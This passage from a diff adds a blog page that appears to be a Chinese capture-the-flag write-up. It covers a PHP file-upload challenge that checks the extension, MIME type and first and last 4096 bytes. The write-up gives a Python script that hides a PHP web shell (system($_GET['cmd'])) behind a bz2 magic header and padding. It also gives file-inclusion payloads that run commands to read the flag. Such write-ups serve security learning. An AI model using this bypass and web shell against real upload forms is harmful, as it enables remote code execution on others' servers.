+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fseek</span>($fh, <span style="color:#f92672">-</span><span style="color:#ae81ff">4096</span>, <span style="color:#a6e22e">SEEK_END</span>);
+</span></span><span style="display:flex;"><span>    $tail <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($fh, <span style="color:#ae81ff">4096</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($fh);
+</span></span><span style="display:flex;"><span>    $sample <span style="color:#f92672">=</span> $head <span style="color:#f92672">.</span> $tail;
+</span></span><span style="display:flex;"><span>    $lower <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($sample);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($block_list <span style="color:#66d9ef">as</span> $pat) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($sample, $pat) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 为避免泄露过多信息，这里不直接 echo sample（你之前有 echo，保持注释）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($lower, <span style="color:#a6e22e">strtolower</span>($pat)) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GeekChallenge_2025&#39;</span>;
+</span></span><span style="display:flex;"><span>$SANDBOX <span style="color:#f92672">=</span> <span style="color:#a6e22e">sys_get_temp_dir</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/uploads_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($SANDBOX)) <span style="color:#a6e22e">mkdir</span>($SANDBOX, <span style="color:#ae81ff">0700</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;No file.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $tmp <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
+</span></span><span style="display:flex;"><span>    $orig <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_uploaded_file</span>($tmp)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Upload error.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">pathinfo</span>($orig, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext, $allowed_extensions)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Bad extension.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $finfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">finfo_open</span>(<span style="color:#a6e22e">FILEINFO_MIME_TYPE</span>);
+</span></span><span style="display:flex;"><span>    $mime <span style="color:#f92672">=</span> <span style="color:#a6e22e">finfo_file</span>($finfo, $tmp);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">finfo_close</span>($finfo);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($mime, $allowed_mime_types)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Bad mime.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">content_filter</span>($tmp, $BLOCK_LIST)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Content blocked.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $newname <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9._-]/&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, $orig);
+</span></span><span style="display:flex;"><span>    $dest <span style="color:#f92672">=</span> $SANDBOX <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $newname;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">move_uploaded_file</span>($tmp, $dest)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Move failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;UPLOAD_OK:&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($newname, <span style="color:#a6e22e">ENT_QUOTES</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>对文件后缀名进行白名单检测</li>
+<li>对文件内容前后首尾两端各 4096 字节内容进行黑名单检查</li>
+<li>后端用<code>finfo_file()</code>检测文件实际 MIME 类型进行白名单检查，防止抓包修改</li>
+</ul>
+<p><strong>只要在上传的文件头部添加一个合法的 bz2 文件头部标识（魔术字节 BZh），在内容中间进行 PHP 代码注入，最后将两端进行字节填充即可构造出攻击文件，后缀为 bz2</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e"># 攻击文件构造代码</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># bz2 文件头部标识</span>
+</span></span><span style="display:flex;"><span>MAGIC <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BZh&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prepad_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>   <span style="color:#75715e"># 放在 payload 之前（&gt;4096）</span>
+</span></span><span style="display:flex;"><span>postpad_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>  <span style="color:#75715e"># 放在 payload 之后（&gt;4096）</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prepad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> prepad_len
+</span></span><span style="display:flex;"><span>postpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> postpad_len
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exploit <span style="color:#f92672">=</span> MAGIC <span style="color:#f92672">+</span> prepad <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postpad <span style="color:#75715e"># 最总要写入的字节内容</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;evil.bz2&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(exploit)
+</span></span></code></pre></div><p><strong>将生成的 evil.bz2 文件在 /upload.php 中上传，在访问 /index.php 页面执行文件包含远程 rce 即可，最终  Payload 如下</strong></p>
+<pre tabindex="0"><code class="language-Payload" data-lang="Payload">index.php?f=xxx.bz2&amp;cmd=cat /flag/flag.txt
+index.php?f=xxx.bz2&amp;cmd=env | grep SYC
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://lhzzz08.github.io/">Lhz&#39;s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
